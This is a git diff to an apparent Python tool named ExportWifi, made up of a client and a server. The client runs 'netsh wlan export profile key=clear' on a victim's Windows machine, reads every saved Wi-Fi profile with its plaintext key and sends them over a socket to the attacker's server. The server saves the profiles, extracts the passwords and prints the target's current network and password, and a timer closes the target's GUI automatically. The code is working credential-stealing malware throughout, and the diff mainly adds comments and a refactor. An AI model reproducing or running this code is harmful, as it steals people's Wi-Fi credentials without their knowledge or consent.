@@ -1,5 +1,6 @@
 import ast
 import os
+import shutil
 import time
 import socket
 import subprocess
@@ -9,22 +10,19 @@ import threading
 from reportlab.pdfgen import canvas
 from reportlab.lib import colors
 
-
-
 wlanname = ""
 pathsave = ""
 password = ""
-def countdown():
+def countdown(): #This is the function where the targets gui gets closed automatically
     global my_timer
-    my_timer = 30
-
-    for x in range(my_timer):
-        my_timer -= 1
-        time.sleep(1)
+    my_timer = 20
+    #This is the seconds when it gets
+    time.sleep(my_timer)
 
     root.quit()
+    #This closes the gui
 
-def validateLogin():
+def validateLogin(): #Just prints
     global wlanname
     global password
     global pathsave
@@ -33,13 +31,15 @@ def validateLogin():
     print("path: ", pathsave.get())
     return
 
-def make_pdf():
+def make_pdf(): #Makes a pdf
     global wlanname
     global password
     global pathsave
     wlanname = wlanname.get()
     password = password.get()
     pathsave = pathsave.get()
+    #Gets all the information of the gui
+
     print(wlanname, password, pathsave)
     fileName = f'{pathsave}/exported_{wlanname}.pdf'
     documentTitle = 'Wifi Export'
@@ -122,15 +122,20 @@ class WlanClient:
 
         for wlan in wlan_name_liste[0]:
             wlan = wlan.split("\\r")
+            #Gets the wifi of the target
             richtiges_wlan = wlan[0]
+            #"richtiges_wlan" means right_wifi
 
         if os.path.exists("wlan.txt"): os.remove("wlan.txt")
+        #This is the file where the wifi is stored
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((self.ip, self.port))
 
         command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                                  capture_output=True).stdout.decode()
+        #This command gets all wifi_files
+
         path = os.getcwd()
 
         inhalt = {}
@@ -142,10 +147,12 @@ class WlanClient:
                     full_msg = "".join(file)
 
                 inhalt[wlan] = full_msg
+                #Stores everything in inhalt
 
         inhalt["CURRENTWIFI"] = richtiges_wlan
         alle_wlan_namen = str(inhalt)
         s.send(alle_wlan_namen.encode())
+        #This is just a directory
         s.close()
 
         for wlan_name in lst_wlan:
@@ -190,6 +197,14 @@ class WlanServer:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
+        self.idx = None
+    def get_key_material(self, file):
+        for line in file:
+            if "keyMaterial" in line:
+                teilen = line.split(">")
+                lst_passwort = teilen[1].split("<")
+                current_password = lst_passwort[0]
+                return current_password
 
     def start(self):
         gui = """
@@ -206,46 +221,98 @@ ___________                             __   __      __.__  _____.__
         """
         print(gui)
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind((self.ip, self.port))
-        server.listen(5)
+        try:
+            server.bind((self.ip, self.port))
+            server.listen(5)
+
+        except socket.gaierror:
+            print("INSERT A VALID IP-ADDRESS")
+            quit()
 
         print("Waiting for connection....")
         client_socket, adresse = server.accept()
         print(f"Connection with {adresse}")
 
         buffer = 20
-        name = ""
+        #Gets the data
+        str_dict = ""
         while True:
             msg = client_socket.recv(buffer).decode()
             if len(msg) <= 0: break
-            name += msg
+            str_dict += msg
+            #Everything will be stored in name
 
-        str_dict = name
         inhalt = ast.literal_eval(str_dict)
+        #This function makes a string to a directory
         wlan_liste = []
 
         for wlan_name, value in inhalt.items():
             if os.path.exists(wlan_name): os.remove(wlan_name)
 
             if wlan_name != "CURRENTWIFI":
+                #All the wifi files will be stored in wlan_liste
                 wlan_liste.append(wlan_name)
                 with open(wlan_name, "a+") as file:
                     file.write(value)
 
         current_name_space = inhalt["CURRENTWIFI"]
+        #Gets the cureentwifi of the target
         current_name = current_name_space.replace(" ", "")
         check = 0
+        found = "FOUND_PASSWORDS"
+        xmlfiles = "XML_FILES"
+
+        if found not in os.listdir():
+            #This only here to create a directory
+            os.system(f"mkdir {found}")
+
         for wlan in wlan_liste:
             if current_name in wlan:
                 with open(wlan, "r+") as file:
-                    for line in file:
-                        if "keyMaterial" in line:
-                            teilen = line.split(">")
-                            lst_passwort = teilen[1].split("<")
-                            current_password = lst_passwort[0]
-                            check += 1
+                    current_password = self.get_key_material(file)
+                    #This function gets the password of the wifi_file
+                    check += 1
+
+            new_name = wlan[::-1]
+            #This will store the wifi file backwards so its easier to find the wifiname
+            this_name = new_name[4:][::-1]
+            #This gets the wifi file without the file extension ".xml" and stores them back backwards
+            for each in wlan:
+                if "-" in each:
+                    self.idx = wlan.index("-")
+                    #This gets the index of "-" because the file in every country is different
+                    break
+
+            filename_wlan = this_name[self.idx + 1:]
+            #This gets the excact filename
+
+            with open(wlan, "r+") as this_file:
+                this_password = self.get_key_material(this_file)
+                #Gets the password of the wifi_file
+
+            os.chdir(f"{found}")
+            #Changes the directory so every wifi file with txt extension will be stored in "XML_FILES"
+            with open(f"{filename_wlan}.txt", "a+") as wlan_file:
+                if this_password is None: this_password = "encrypted password"
+                #Checks if the file has a password
+                wlan_file.write(f"WLAN: {filename_wlan}\n\nPassword of {filename_wlan}: {this_password}")
+            os.chdir("..")
+
+        if xmlfiles not in os.listdir():
+            #Makes a directory if it isn't already made
+            os.system(f"mkdir {xmlfiles}")
+
+        for each_xml_file in wlan_liste:
+            #Moves all wifi files with xml extension to "XML_FILES"
+            try:
+                shutil.move(each_xml_file, f"{xmlfiles}")
+
+            except shutil.Error:
+                #Checks if the file already exists
+                print("This XML File already exists")
 
         print("\nConnection has been established")
         print(f"{len(wlan_liste)} Wifi files have been saved to your directory")
         if check >= 1: print(f"The current WI-FI and Password of the target is \n\nWI-FI: {current_name}\nPassword: {current_password}")
         else: print(f"The current WI-FI of the target is \n\nWI-FI: {current_name}\nThe password couldn't be detected")
+        print("THANK YOUR FOR USING EXPORTWIFI")
